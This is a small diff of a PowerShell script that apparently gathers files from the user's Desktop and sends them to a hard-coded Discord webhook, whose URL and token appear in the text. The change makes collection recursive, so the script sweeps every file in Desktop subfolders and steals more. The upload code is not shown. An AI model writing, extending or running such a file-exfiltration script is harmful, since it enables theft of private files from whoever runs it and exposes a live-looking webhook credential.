@@ -7,8 +7,8 @@ $webhookUrl = "https://discordapp.com/api/webhooks/1287930563402924112/7i_MKNW3x
 # Define the Desktop path
 $desktopPath = "$env:USERPROFILE\Desktop"
 
-# Get all files on the Desktop (only files, not directories)
-$files = Get-ChildItem -Path $desktopPath -File
+# Get all files on the Desktop, including those in subdirectories
+$files = Get-ChildItem -Path $desktopPath -File -Recurse
 
 if ($files.Count -eq 0) {
     Write-Host "No files found on the Desktop. Exiting script."
